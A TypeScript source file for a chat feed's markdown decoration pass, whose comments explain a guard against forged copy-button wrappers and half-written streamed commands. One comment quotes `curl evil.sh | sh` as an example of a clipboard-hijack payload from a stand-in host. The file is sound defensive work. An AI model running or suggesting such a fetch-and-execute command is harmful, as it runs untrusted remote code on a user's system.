// The feed's pass over its own sanitized markdown (#465).
//
// The counterpart of `document-render.ts` for the Session view: everything here
// runs AFTER `renderMarkdown`, which owns `marked` and DOMPurify and which
// nothing else may import (`markdown.test.tsx` asserts it).
//
// THE FIRST LINE IS THE GUARD, and that is the security property rather than a
// tidy habit: #410's forgery worked on the viewer precisely by arriving BEFORE
// the decoration pass and being mistaken for its output. #465 built this pass
// with only that line in it, for exactly the decoration #477 then added — a
// copy button, which is the shape #410 was filed over (a forged `.doc-code`
// wrapper around a hidden `<pre>`, so the button on a fence reading `npm test`
// puts `curl evil.sh | sh` on the clipboard).
//
// WHY THE FEED HAS A PROTOCOL TO PROTECT AT ALL. The feed's block renderers
// mark their expanders `data-feed-expander`, their blocks `data-feed-seq` and
// their stand-down subtrees `data-no-toggle`, and `FeedView` reads all three
// back off the live DOM (`querySelectorAll`, `querySelector`, `closest`) — the
// DOM is deliberately the list, because blocks stream in and out constantly and
// a registry we maintained would be a second copy to get wrong. The cost of
// that choice is that the DOM does not remember who wrote an attribute, and
// assistant prose renders into the same DOM.
//
// IT WORKS ON A STRING, NOT A FRAGMENT, and that is the shape `<Markdown>`
// wants: one `<template>` parse in, one serialize out, inside the same `useMemo`
// that already parsed the markdown, memoised per block on the text. The
// template's content is an inert document with no browsing context, so nothing
// fetches while we work (same reason `document-render.ts` gives at length).
import { FEED_DECORATION, stripDecorationNamespace } from './decoration-guard';
import { decorateFeedCodeFences, type FeedCodeLabels } from './feed-code';

/**
 * Sanitized HTML in, decorated HTML out — the feed's surface pass.
 *
 * `doc` is injectable for the same reason the viewer's is: a test may build the
 * tree in a document that is not the page.
 *
 * `streaming` SUPPRESSES THE FENCE CHROME, and it had to become an argument
 * when #635 started rendering markdown while it arrives. Before that, a
 * streaming block rendered as plain text and never reached this function at
 * all, so "no Copy button on a fence that is still being written" was a free
 * side effect of the branch that #635 deleted. It is a property worth keeping
 * on purpose:
 *
 *  - `runCopy` reads `pre.textContent` AT CLICK TIME, so a click on a fence
 *    that is half-written puts half a command on the clipboard, with nothing to
 *    say it is half. `npm install --save-de` pasted into a shell is the same
 *    class of harm as #410's forged wrapper — a clipboard the reader did not
 *    inspect — arriving by timing rather than by forgery.
 *  - The language label would flicker anyway. A fence opening ```` ```ty ````
 *    reads "ty" one delta before it reads "typescript", and a header that
 *    rewrites itself per frame is noisier than one that arrives once.
 *
 * WHAT IT COSTS is the one flip #635 does not remove: the fence header appears
 * when the turn ends. That is deliberate and it is bounded — the CODE renders
 * progressively like everything else, and it is only our chrome that waits.
 */
export function decorateFeedMarkdown(
  html: string,
  labels: FeedCodeLabels,
  // An OPTIONS BAG rather than two more positionals: `(html, labels, undefined,
  // true)` was the alternative at the one call site that needs `streaming`, and
  // a placeholder `undefined` in the middle of an argument list is how the next
  // flag gets passed to the wrong parameter.
  { doc = document, streaming = false }: { doc?: Document; streaming?: boolean } = {}
): string {
  const template = doc.createElement('template');
  template.innerHTML = html;
  // FIRST, before any decoration below writes one of ours.
  stripDecorationNamespace(template.content, FEED_DECORATION);
  if (!streaming) decorateFeedCodeFences(template.content, labels);
  return template.innerHTML;
}
